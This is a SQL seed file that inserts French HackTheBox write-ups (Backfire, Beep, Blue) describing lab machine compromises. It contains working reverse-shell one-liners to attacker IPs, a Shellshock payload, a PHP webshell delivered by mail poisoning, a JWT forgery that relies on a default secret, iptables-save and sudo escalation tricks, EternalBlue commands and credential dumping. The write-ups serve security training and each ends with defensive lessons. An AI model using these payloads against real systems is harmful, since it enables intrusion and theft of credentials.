sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

3. **Accès final** :
Il ne reste plus qu''à se connecter via SSH pour obtenir un shell interactif avec les privilèges maximaux.

```bash
ssh -i id_ed25519 root@10.10.11.49
```

---

### Élévation de Privilèges : De ilya à sergej

Après avoir stabilisé mon accès en tant que **ilya**, l''énumération du système révèle la présence d''un second utilisateur, **sergej**, ainsi qu''une instance de **HardHatC2** en cours d''exécution. Un fichier `hardhat.txt` dans le répertoire personnel de **ilya** indique que **sergej** a installé ce framework C2 en conservant les configurations par défaut.

L''analyse des ports locaux montre que le **TeamServer** de **HardHatC2** écoute sur les ports **5000** et **7096**, lesquels étaient filtrés lors du scan externe.

#### Exploitation de HardHatC2 (JWT Secret)

Le framework **HardHatC2** utilise par défaut un **JWT Secret** statique défini dans son fichier de configuration `appsettings.json`. Si ce secret n''est pas modifié, n''importe qui peut forger un jeton d''authentification pour devenir administrateur de l''instance C2.

> **Schéma Mental : Détournement de C2 par Forgery**
> 1. **Identification** : Repérer un service C2 (HardHatC2) tournant avec les réglages d''usine.
> 2. **Extraction** : Récupérer le **JWT Secret** par défaut (`jtee43gt-6543-2iur-9422-83r5w27hgzaq`).
> 3. **Proxying** : Créer un **SSH Tunnel** pour accéder à l''interface Web locale du C2.
> 4. **Forgery** : Utiliser une instance locale de HardHatC2 ou un outil de manipulation JWT pour générer un cookie valide.
> 5. **RCE** : Utiliser les fonctionnalités natives du C2 (Terminal/Interactive Shell) pour exécuter des commandes sur l''hôte.

Je mets en place un **Local Port Forwarding** via SSH pour accéder à l''interface :

```bash
# Tunneling des ports d''administration de HardHatC2
ssh -i id_rsa ilya@10.10.11.49 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
```

En utilisant une instance locale de **HardHatC2** configurée avec le même secret, je récupère le jeton de session dans le **Local Storage** du navigateur et l''injecte dans ma session pointant vers la machine cible. Une fois authentifié sur `https://127.0.0.1:7096`, je crée un nouvel utilisateur avec le rôle **Team Lead**.

Depuis le terminal intégré du C2, j''exécute un **Reverse Shell** pour obtenir un accès direct en tant que **sergej** :

```bash
# Payload exécuté via le terminal HardHatC2
bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
```

---

### Domination Totale : De sergej à root

L''inspection des privilèges **Sudo** de **sergej** révèle un vecteur critique lié à la gestion du pare-feu.

```bash
sergej@backfire:~$ sudo -l
User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```

#### Vecteur final : Arbitrary File Write via iptables-save

L''utilitaire **iptables-save** possède une option `-f` (ou `--file`) qui permet d''écrire l''état actuel des règles de filtrage dans un fichier spécifié. Puisque la commande est exécutable via **Sudo**, cela m''octroie une primitive d''**Arbitrary File Write** en tant que **root**.

Pour transformer cette écriture de fichier en exécution de code, je vais injecter ma clé publique SSH dans la configuration de **iptables** via le module **comment**, puis sauvegarder le résultat dans le fichier `authorized_keys` de **root**.

> **Schéma Mental : Abus de iptables pour l''écriture de fichiers**
> 1. **Injection** : Insérer une chaîne de caractères arbitraire (Clé SSH) dans la mémoire du noyau via une règle `iptables` factice utilisant un commentaire.
> 2. **Persistance** : Utiliser `iptables-save -f` pour dumper cette mémoire dans un fichier sensible (`/root/.ssh/authorized_keys`).
> 3. **Tolérance** : Le service SSH ignore les lignes malformées (les règles iptables) et ne traite que la ligne contenant la clé valide.

```bash
# 1. Injection de la clé SSH dans un commentaire iptables (avec newlines pour l''isolation)
sudo iptables -A INPUT -i lo -m comment --comment $''\nssh-ed25519 AAAAC3...[SNIP]... root@attackbox\n''

# 2. Écriture forcée dans le répertoire personnel de root
sudo iptables-save -f /root/.ssh/authorized_keys

# 3. Connexion SSH directe en tant que root
ssh -i id_rsa root@10.10.11.49
```

Je compromets ainsi totalement la machine et récupère le flag final dans `/root/root.txt`.

---

### Analyse Post-Exploitation "Beyond Root"

La compromission de **Backfire** met en lumière les risques critiques liés à l''infrastructure de **Red Team** elle-même.

1.  **C2 Security** : L''utilisation de frameworks comme **Havoc** ou **HardHatC2** sans durcissement préalable transforme l''attaquant en cible. La vulnérabilité **SSRF** (CVE-2024-41570) dans Havoc montre que même les outils de sécurité peuvent souffrir de failles de gestion de mémoire ou de logique de callback.
2.  **Default Credentials & Secrets** : Le maintien du **JWT Secret** par défaut dans **HardHatC2** est une erreur fatale. Dans un environnement de production ou d''engagement réel, ces secrets doivent être générés de manière cryptographiquement sécurisée lors du déploiement.
3.  **Sudo Over-Privileging** : Autoriser `iptables-save` avec l''option `-f` est équivalent à donner un accès **root** complet. Une restriction via un **Sudoers sudoedit** ou l''interdiction d''arguments spécifiques aurait pu mitiger ce risque.
4.  **Infrastructure Isolation** : Les ports de management (40056, 5000, 7096) ne devraient jamais être accessibles, même indirectement via une **SSRF**. L''utilisation de sockets Unix ou d''une authentification mutuelle (mTLS) pour les communications inter-C2 est recommandée.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'Privilege Escalation'],
  'Je commence par une phase classique de reconnaissance avec **nmap** pour identifier la surface d''attaque. Le scan complet des ports TCP révèle trois services exposés et deux ports filtrés. **Résultats du scan :** * **Port 22 (SSH)** : OpenSSH 9.2p1 (...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-backfire-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Beep
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Beep',
  'htb-beep',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

# Phase 1 : Reconnaissance & Brèche Initiale

L''énumération de **Beep** révèle une surface d''attaque particulièrement étendue. La machine semble héberger une suite complète de services de communication (PBX), ce qui multiplie les vecteurs d''entrée potentiels.

### Énumération des Services (Scanning)

Je commence par un scan **Nmap** complet pour identifier tous les ports ouverts, suivi d''un scan agressif sur les services détectés.

```bash
# Scan rapide de tous les ports
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.7

# Scan détaillé des services identifiés
nmap -sC -sV -p 22,25,80,110,111,143,443,745,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
```

**Résultats clés :**
*   **Port 80/443** : Serveur Apache 2.2.3 (CentOS) faisant tourner **Elastix**, une solution de téléphonie IP.
*   **Port 10000** : Interface de gestion **Webmin** 1.570.
*   **Port 25** : Service **SMTP** (Postfix).
*   **Port 4559/5038** : Services liés à la téléphonie (**HylaFAX**, **Asterisk**).

> **Schéma Mental :** L''abondance de services sur une version obsolète de **CentOS 5** suggère une machine "legacy" où les vulnérabilités de type **Local File Inclusion (LFI)** ou **Remote Code Execution (RCE)** sur des composants web mal maintenus sont probables.

---

### Énumération Web & Directory Bruteforcing

Le port 80 redirige systématiquement vers le port 443. En accédant à l''interface, je confirme la présence d''**Elastix**. Je lance un **Directory Bruteforcing** pour identifier des points d''entrée cachés.

```bash
dirsearch.py -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php -t 50
```

Le scan révèle plusieurs répertoires intéressants :
*   `/admin` : Interface d''administration FreePBX (nécessite une authentification).
*   `/vtigercrm` : Instance de CRM intégrée à la solution.
*   `/recordings` : Interface d''accès aux enregistrements audio.

---

### Identification de la Vulnérabilité : Local File Inclusion (LFI)

En utilisant **Searchsploit**, je recherche des vulnérabilités connues pour **Elastix**. Une vulnérabilité critique de type **LFI** est identifiée dans le module **vTigerCRM**.

```bash
searchsploit elastix
# Exploit identifié : Elastix 2.2.0 - ''graph.php'' Local File Inclusion (37637.pl)
```

La vulnérabilité réside dans le paramètre `current_language` du script `/vtigercrm/graph.php`. Ce paramètre n''est pas assaini, permettant de traverser l''arborescence (**Path Traversal**) et de lire des fichiers sensibles. De plus, l''utilisation du **Null Byte** (`%00`) permet de tronquer l''extension `.php` ajoutée par le serveur sur les anciennes versions de PHP.

**Vecteur d''attaque LFI :**
```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

> **Schéma Mental :** L''objectif ici n''est pas seulement de lire `/etc/passwd`, mais de cibler les fichiers de configuration de l''application (**amportal.conf**) qui contiennent souvent des identifiants en clair pour la base de données ou les comptes administrateurs.

---

### Extraction de Credentials & Premier Accès

La lecture de `/etc/amportal.conf` via la **LFI** permet de récupérer des mots de passe critiques :

*   `AMPDBPASS=jEhdIekWmdjE`
*   `AMPMGRPASS=jEhdIekWmdjE`

Je teste immédiatement la réutilisation de mot de passe (**Credential Reuse**) sur les différents services. Le mot de passe `jEhdIekWmdjE` s''avère être celui du compte **root** pour plusieurs services.

#### Accès via SSH
```bash
ssh root@10.10.10.7
# Password: jEhdIekWmdjE
```

#### Accès via Webmin (Port 10000)
L''accès avec `root:jEhdIekWmdjE` fonctionne également sur l''interface **Webmin**, offrant un contrôle total sur le système via le navigateur.

### Vecteurs Alternatifs identifiés

Bien que l''accès **SSH** direct soit la voie la plus simple, d''autres vecteurs de brèche initiale ont été confirmés lors de la reconnaissance :
1.  **RCE (Remote Code Execution)** : Via l''exploit `18650.py` ciblant une vulnérabilité dans l''extension d''appel de FreePBX (nécessite une configuration SSL spécifique pour accepter les protocoles obsolètes comme **TLSv1.0**).
2.  **Shellshock** : Le service **Webmin** sur le port 10000 est vulnérable à **Shellshock** via le header `User-Agent` sur la page `/session_login.cgi`.
3.  **Log Poisoning via SMTP** : En envoyant un email contenant un payload PHP à un utilisateur local (ex: `asterisk@localhost`), puis en incluant le fichier de log mail `/var/mail/asterisk` via la **LFI**, il est possible d''obtenir un **Webshell**.

---

### Énumération Interne via Local File Inclusion (LFI)

Une fois la vulnérabilité **Local File Inclusion** identifiée sur `/vtigercrm/graph.php`, ma priorité est l''extraction de secrets et de fichiers de configuration. Sur une distribution **CentOS** ancienne comme celle-ci, les fichiers de configuration de l''**IPBX** (Asterisk/Elastix) contiennent souvent des identifiants en clair.

```bash
# Lecture du fichier de configuration principal d''Elastix/FreePBX
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action"
```

L''extraction révèle plusieurs mots de passe critiques :
*   `AMPDBPASS = jEhdIekWmdjE`
*   `ARI_ADMIN_PASS = jEhdIekWmdjE`
*   `CDBAPASS = jEhdIekWmdjE`

> **Schéma Mental :**
> LFI (Accès fichiers) -> `/etc/amportal.conf` (Extraction secrets) -> **Credential Reuse** (Test des mots de passe sur SSH/Webmin/Databases).

---

### Mouvement Latéral : Remote Code Execution (RCE)

Si le **Credential Reuse** direct échoue ou pour diversifier les points d''entrée, j''exploite une **RCE** connue sur **FreePBX** (CVE-2012-4869). Le script `18650.py` permet d''injecter des commandes via le paramètre d''extension.

En raison de la vétusté des protocoles **SSL/TLS** (SSLv3/TLS1.0) sur la cible, je dois ajuster mon environnement local et le script :

```python
# Ajustement du contexte SSL en Python pour ignorer les erreurs de certificat
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Modification de l''appel urllib
urllib.urlopen(url, context=ctx)
```

Exécution du reverse shell pour obtenir un accès initial en tant qu''utilisateur `asterisk` :
```bash
# Listener local
nc -lnvp 443

# Exécution de l''exploit (nécessite une extension valide, ex: 233 trouvée via svwar)
python2 18650.py 10.10.10.7 233
```

---

### Escalade de Privilèges : De `asterisk` à `root`

Une fois le shell obtenu en tant qu''utilisateur `asterisk`, je procède à l''énumération des vecteurs d''escalade. La commande `sudo -l` révèle une configuration extrêmement permissive.

```bash
asterisk@beep$ sudo -l
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /usr/bin/yum
    ...
```

#### Méthode 1 : Exploitation de `nmap` (Mode Interactif)
Les versions anciennes de **nmap** possèdent un mode interactif permettant l''exécution de commandes système.

```bash
sudo nmap --interactive
nmap> !bash
root@beep# id
uid=0(root) gid=0(root)
```

#### Méthode 2 : Manipulation de permissions via `chmod`
Je peux utiliser les droits `sudo` sur `chmod` pour poser un bit **SUID** sur le binaire `/bin/bash`.

```bash
sudo chmod 4755 /bin/bash
bash -p
```

---

### Vecteurs Alternatifs et Persistance

#### Credential Reuse (SSH & Webmin)
Le mot de passe `jEhdIekWmdjE` extrait via la **LFI** s''avère être celui du compte `root`. Cela permet un accès direct via **SSH** ou sur l''interface **Webmin** (Port 10000).

#### Shellshock (CVE-2014-6271)
Le serveur utilise des scripts **CGI** anciens. Je peux injecter des commandes via le header `User-Agent` lors d''une requête vers `/session_login.cgi`.

```bash
# Test de vulnérabilité Shellshock
curl -k -H "User-Agent: () { :; }; /bin/sleep 10" https://10.10.10.7:10000/session_login.cgi
```

#### Mail Poisoning & Webshell
En l''absence de shell direct, j''utilise le service **SMTP** pour injecter du code PHP dans les logs de messagerie, puis je l''exécute via la **LFI**.

> **Schéma Mental :**
> **SMTP** (Envoi de code PHP) -> `/var/mail/asterisk` (Stockage du payload) -> **LFI** (Inclusion et exécution du code).

```bash
# Injection du payload via swaks
swaks --to asterisk@localhost --body ''<?php system($_REQUEST["cmd"]); ?>'' --server 10.10.10.7

# Exécution via LFI
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&cmd=id"
```

---

# Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Une fois l''accès initial obtenu ou les informations d''identification extraites via la vulnérabilité **Local File Inclusion (LFI)**, plusieurs vecteurs permettent d''atteindre le privilège **root**. La machine Beep est une illustration parfaite de la "mort par mille coupures" : une multitude de services mal configurés et obsolètes.

### Vecteur 1 : Exploitation des droits Sudo (Post-RCE asterisk)

Si l''accès est obtenu via l''exploit **Remote Code Execution (RCE)** (script `18650.py`), nous tombons avec l''identité de l''utilisateur `asterisk`. L''énumération des privilèges via `sudo -l` révèle une configuration catastrophique.

```bash
# Vérification des droits sudo
sudo -l

# Sortie notable :
# (root) NOPASSWD: /usr/bin/nmap
# (root) NOPASSWD: /bin/chmod
```

#### Méthode A : Nmap Interactive Mode
Sur les anciennes versions de **nmap**, le mode interactif permet d''exécuter des commandes système avec les privilèges du binaire.

```bash
sudo nmap --interactive
nmap> !sh
# id
uid=0(root) gid=0(root)
```

#### Méthode B : Abus de Chmod (SUID)
Puisque nous pouvons exécuter `chmod` en tant que **root**, nous pouvons modifier les permissions de `/bin/bash` pour y ajouter le bit **SUID**.

```bash
sudo chmod 4755 /bin/bash
/bin/bash -p
# id
euid=0(root)
```

> **Schéma Mental :**
> Droits **Sudo** excessifs -> Binaire avec fonction de "shell out" ou modification de permissions -> Escalade directe vers **root**.

---

### Vecteur 2 : Credential Reuse (SSH & Webmin)

L''exploitation de la **LFI** sur `/vtigercrm/graph.php` a permis de lire le fichier de configuration `/etc/amportal.conf`. Ce fichier contient des mots de passe en clair utilisés pour la base de données et les services internes.

**Password trouvé :** `jEhdIekWmdjE`

Le **Credential Reuse** est ici total. Ce mot de passe est partagé par le compte **root** pour l''accès **SSH** et l''interface d''administration **Webmin** (port 10000).

```bash
# Accès direct via SSH
ssh root@10.10.10.7
# Password: jEhdIekWmdjE
```

---

### Vecteur 3 : Shellshock (Webmin CGI)

Le service **Webmin** (version 1.570) tourne sur le port 10000. Étant donné l''ancienneté du système (CentOS 5), il est vulnérable à **Shellshock** via ses scripts **CGI**.

> **Schéma Mental :**
> Requête HTTP -> Serveur Web passe les Headers en variables d''environnement -> Bash vulnérable interprète les fonctions malformées `() { :; };` -> Exécution de code arbitraire avant même l''authentification.

L''injection se fait dans le header `User-Agent` lors d''une requête sur `/session_login.cgi`.

```http
POST /session_login.cgi HTTP/1.1
Host: 10.10.10.7:10000
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.2/443 0>&1
Content-Length: 28

page=%2F&user=root&pass=root
```

---

### Vecteur 4 : LFI to RCE via Mail Poisoning

Si l''accès direct échoue, nous pouvons transformer la **LFI** en **RCE** en injectant du code PHP dans un fichier que nous pouvons lire. Le service **SMTP** (port 25) permet d''envoyer un mail à un utilisateur local (ex: `asterisk`), ce qui crée un fichier dans `/var/mail/asterisk`.

1. **Injection du Payload via SMTP :**
```bash
telnet 10.10.10.7 25
MAIL FROM:<attacker@kali.org>
RCPT TO:<asterisk@localhost>
DATA
Subject: Webshell
<?php system($_REQUEST[''cmd'']); ?>
.
QUIT
```

2. **Exécution via LFI :**
Il suffit ensuite d''appeler le fichier de mail via le paramètre vulnérable en utilisant un **Null Byte** (`%00`) pour stopper la concaténation de l''extension `.php` par l''application.

```url
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&cmd=id
```

---

### Analyse Beyond Root

La compromission de Beep met en lumière plusieurs échecs critiques de sécurité :

1.  **Obsolescence logicielle (Legacy Systems) :** Le système tourne sur une version de **CentOS** en fin de vie, rendant le noyau et les services vulnérables à des failles critiques comme **Shellshock**.
2.  **Mauvaise gestion des secrets :** Le stockage de mots de passe en clair dans des fichiers de configuration (`/etc/amportal.conf`) accessibles via une **LFI** a permis un **Credential Reuse** immédiat sur **SSH**.
3.  **Principe du moindre privilège non respecté :** L''utilisateur `asterisk` disposait de droits **Sudo** sur des binaires dangereux (`nmap`, `chmod`), transformant une compromission de service mineure en une prise de contrôle totale du serveur.
4.  **Surface d''attaque excessive :** Trop de services inutiles (HylaFAX, Cyrus IMAP, MySQL, etc.) sont exposés, multipliant les points d''entrée potentiels. Une segmentation réseau ou un **Hardening** des services aurait limité l''impact.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'L''énumération de **Beep** révèle une surface d''attaque particulièrement étendue. La machine semble héberger une suite complète de services de communication (PBX), ce qui multiplie les vecteurs d''entrée potentiels. Je commence par un scan **Nmap** com...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-beep-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Blue
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Blue',
  'htb-blue',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance & Scanning

Ma phase de reconnaissance commence par un scan **TCP** complet pour identifier la surface d''attaque. J''utilise **Nmap** avec une cadence élevée pour gagner en efficacité, suivi d''un scan de services ciblé.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.40

# Scan détaillé des services identifiés
nmap -p 135,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.10.40
```

Le scan révèle les ports classiques d''un environnement **Windows** :
*   **135/TCP** : **MSRPC**
*   **139/TCP** : **NetBIOS-ssn**
*   **445/TCP** : **Microsoft-ds** (SMB)

L''énumération via les scripts par défaut de **Nmap** identifie précisément la cible : **Windows 7 Professional 7601 Service Pack 1**. L''absence de **Message Signing** sur le protocole **SMBv2** est une première indication de faiblesse de configuration.

### 2. Énumération du service SMB

J''approfondis l''analyse du service **SMB** pour vérifier l''existence de partages accessibles sans authentification (**Null Session**).

```bash
# Énumération des partages avec smbmap (astuce du faux utilisateur pour forcer la session Guest)
smbmap -H 10.10.10.40 -u "0xdf" -p "0xdf"

# Exploration manuelle des partages identifiés
smbclient //10.10.10.40/Users
```

Bien que les partages `Share` et `Users` soient lisibles en **READ ONLY**, ils ne contiennent que des répertoires par défaut. L''intérêt de cette machine ne réside pas dans la fuite de données via les partages, mais dans la vulnérabilité intrinsèque du service.

### 3. Identification de la vulnérabilité : MS17-010

Compte tenu de la version obsolète de l''OS (**Windows 7**), je suspecte immédiatement une vulnérabilité de type **Remote Code Execution (RCE)** liée à l''implémentation du protocole **SMBv1**. J''utilise le moteur de scripts **NSE** pour confirmer cette hypothèse.

```bash
nmap -p 445 --script vuln -oA scans/nmap-smbvulns 10.10.10.40
```

Le résultat est sans appel : la machine est vulnérable à **MS17-010**, également connue sous le nom de **ETERNALBLUE**. Cette faille permet une corruption du **Kernel Pool** via des paquets **SMBv1** malformés.

> **Schéma Mental :**
> **Scan de ports** (445 ouvert) -> **Fingerprinting OS** (Windows 7 SP1) -> **Analyse de vulnérabilité** (Vérification SMBv1) -> **Confirmation MS17-010** -> **Exploitation Kernel**.

### 4. Vecteur d''entrée : Exploitation d''ETERNALBLUE

Je privilégie deux approches pour obtenir un accès initial avec les privilèges les plus élevés (**SYSTEM**).

#### Option A : Framework Metasploit (Méthode Rapide)
C''est la méthode la plus stable pour ce vecteur. Le module exploite la corruption de mémoire pour injecter un **Payload** directement dans le processus système.

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.14
set payload windows/x64/meterpreter/reverse_tcp
run
```

#### Option B : Script Python Manuel (Approche "OSCP-like")
Pour éviter l''usage de Metasploit, j''utilise une version modifiée des scripts de **Worawit** (comme `send_and_execute.py`). Cette méthode nécessite un environnement **Python 2** et l''installation de la bibliothèque **Impacket**.

1.  **Génération du Payload :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

2.  **Exécution de l''exploit :**
Le script va uploader l''exécutable sur le partage `C$` via la faille **MS17-010**, créer un service temporaire et l''exécuter.

```bash
# Dans un environnement virtuel Python 2
python send_and_execute.py 10.10.10.40 rev.exe
```

### 5. Premier Shell & Stabilisation

Une fois l''exploit déclenché, je reçois une connexion sur mon **Listener** netcat.

```bash
rlwrap nc -lnvp 443
```

Le shell obtenu est immédiatement **NT AUTHORITY\SYSTEM**, car l''exploit **ETERNALBLUE** s''exécute au niveau du **Kernel**. Aucune **Privilege Escalation** supplémentaire n''est requise.

```cmd
C:\Windows\system32> whoami
nt authority\system
```

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois l''accès initial obtenu via l''exploitation de la vulnérabilité **MS17-010**, l''objectif est de stabiliser la session, de valider le contexte de sécurité et de procéder à l''extraction des données sensibles. Sur cette machine, l''exploitation mène directement au privilège le plus élevé, court-circuitant les étapes habituelles d''**Escalade de Privilèges** locale.

#### 1. Validation des Privilèges et Stabilisation
Après l''exécution du module **EternalBlue**, la session **Meterpreter** ou le **Reverse Shell** s''exécute dans le contexte du processus `lsass.exe`.

```bash
# Vérification de l''identité de l''utilisateur
getuid # Dans Meterpreter
whoami # Dans un shell CMD

# Informations système pour confirmer l''architecture
sysinfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

> **Schéma Mental :** L''attaque **MS17-010** exploite une corruption de mémoire dans le pool non-paginé du noyau Windows lors de la manipulation de paquets **SMBv1** malformés. Puisque le service **SMB** tourne avec les privilèges **SYSTEM**, l''injection de code (shellcode) hérite directement de ces droits, éliminant le besoin d''un mouvement latéral interne pour compromettre la machine.

#### 2. Énumération Post-Exploitation (Méthode Manuelle)
Si l''exploitation est réalisée via le script Python `send_and_execute.py`, il est nécessaire de préparer un environnement spécifique pour gérer les dépendances **Impacket** en **Python 2.7**, car de nombreux exploits originaux n''ont pas été portés sur Python 3.

```bash
# Création d''un environnement virtuel pour Python 2.7
virtualenv impacket-venv -p $(which python2)
source impacket-venv/bin/activate

# Installation d''Impacket
pip install .

# Génération d''un Payload non-staged avec MSFVenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

#### 3. Logique de Mouvement Latéral et Persistance
Bien que l''accès **SYSTEM** soit immédiat, dans un scénario d''infrastructure plus large (Active Directory), cette machine servirait de point d''appui (**Pivot**) pour attaquer le reste du domaine.

*   **Extraction de Hashs :** Utilisation de **Mimikatz** (via `load kiwi` dans Meterpreter) pour dumper le **SAM** (Security Account Manager) ou extraire des tickets **Kerberos** en mémoire.
*   **Recherche de Tokens :** Vérification des processus actifs pour trouver des jetons d''accès appartenant à des **Domain Admins**.

```bash
# Extraction des hashs locaux (SAM)
hashdump

# Utilisation de Kiwi pour énumérer les credentials en mémoire
load kiwi
creds_all
```

#### 4. Extraction des Flags (Data Exfiltration)
L''énumération du système de fichiers permet de localiser les preuves de compromission. Sous Windows, les fichiers de flags se trouvent généralement sur les **Desktops** des utilisateurs et de l''administrateur.

```cmd
# Navigation vers les répertoires utilisateurs
cd C:\Users
dir /s user.txt root.txt

# Lecture des fichiers
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

> **Schéma Mental :** Dans une phase de post-exploitation standard, si l''accès avait été limité à l''utilisateur `haris`, j''aurais dû rechercher des **Unquoted Service Paths**, des **Scheduled Tasks** mal configurées ou des mots de passe stockés dans le **Registry** pour atteindre le niveau **SYSTEM**. Ici, la vulnérabilité critique du protocole **SMB** agit comme un "Golden Ticket" direct vers le contrôle total du kernel.

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Sur cette machine, l''étape d''exploitation initiale et l''élévation de privilèges sont confondues en une seule action. La vulnérabilité **MS17-010**, connue sous le nom de **ETERNALBLUE**, permet une exécution de code à distance (**Remote Code Execution - RCE**) directement au niveau du **Kernel** Windows. Puisque le service **SMBv1** tourne avec les privilèges les plus élevés, l''exploitation réussie nous octroie immédiatement un accès **NT AUTHORITY\SYSTEM**.

#### 1. Vecteur d''Exploitation : MS17-010 (ETERNALBLUE)

L''analyse de vulnérabilité via **Nmap** a confirmé que la cible est vulnérable au **CVE-2017-0143**. Cette faille réside dans la manière dont le driver `srv.sys` gère les paquets **SMBv1** malformés, entraînant une corruption de la **Non-Paged Kernel Pool**.

> **Schéma Mental :**
> L''attaque exploite une confusion de type et un dépassement de tampon dans la mémoire du noyau. En envoyant des paquets spécifiquement forgés, l''attaquant peut écraser des structures de données en mémoire système. L''objectif est de modifier les jetons de sécurité (**Access Tokens**) du processus courant ou d''injecter une **Shellcode** directement dans l''espace mémoire du **Kernel** pour forcer l''exécution d''un payload avec les privilèges **SYSTEM**.

#### 2. Méthode A : Exploitation via Metasploit

C''est la méthode la plus stable pour ce vecteur. Le module `ms17_010_eternalblue` automatise la corruption du pool et l''injection du **Meterpreter**.

```bash
# Configuration du module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.14
msf6 exploit(ms17_010_eternalblue) > run

# Vérification des privilèges
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
```

#### 3. Méthode B : Exploitation Manuelle (Python & Impacket)

Pour une approche sans **Metasploit** (type OSCP), j''utilise une variante du script `zzz_exploit.py` nommée `send_and_execute.py`. Ce script nécessite un environnement **Python 2** et la bibliothèque **Impacket**.

**Étape 1 : Préparation du Payload**
Je génère un exécutable de type **Reverse Shell** non-staged avec **msfvenom**.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

**Étape 2 : Exécution de l''exploit**
Le script va exploiter la vulnérabilité pour uploader `rev.exe` sur le partage `C$` et créer un service via le **Service Control Manager (SCM)** pour l''exécuter.

```bash
# Activation de l''environnement Python 2
source impacket-venv/bin/activate

# Lancement de l''exploit (utilisation d''un username arbitraire pour forcer l''auth)
python send_and_execute.py 10.10.10.40 rev.exe 
```

**Étape 3 : Capture du Shell**
En parallèle, un listener **netcat** intercepte la connexion entrante.

```bash
rlwrap nc -lnvp 443
# Connexion reçue de 10.10.10.40
C:\Windows\system32> whoami
nt authority\system
```

#### 4. Domination & Récupération des Flags

Une fois le niveau de privilège **SYSTEM** atteint, l''accès aux fichiers sensibles est total. Les flags se trouvent dans les répertoires personnels des utilisateurs.

```cmd
:: Flag Utilisateur
type C:\Users\haris\Desktop\user.txt

:: Flag Root
type C:\Users\Administrator\Desktop\root.txt
```

---

### Analyse Post-Exploitation "Beyond Root"

L''analyse de la machine **Blue** révèle plusieurs faiblesses structurelles typiques des environnements post-2017 non maintenus :

1.  **Absence de Patch Management** : La machine tourne sous **Windows 7 SP1** sans les mises à jour de sécurité critiques de mars 2017. Le patch **KB4012598** aurait suffi à neutraliser l''attaque.
2.  **Protocole Obsolète** : Le protocole **SMBv1** est activé par défaut. Dans un environnement durci, ce protocole doit être désactivé au profit de **SMBv2** ou **SMBv3**, qui intègrent des protections contre les manipulations de mémoire de ce type.
3.  **Null Sessions & Guest Access** : La configuration SMB autorisait l''énumération des partages (`Users`, `Share`) sans authentification valide (ou avec des identifiants arbitraires), facilitant la phase de reconnaissance initiale.
4.  **Message Signing** : Le paramètre `message_signing` était désactivé. Bien que non requis pour **ETERNALBLUE**, cela aurait permis d''autres attaques de type **SMB Relay** si des utilisateurs s''étaient connectés au réseau.

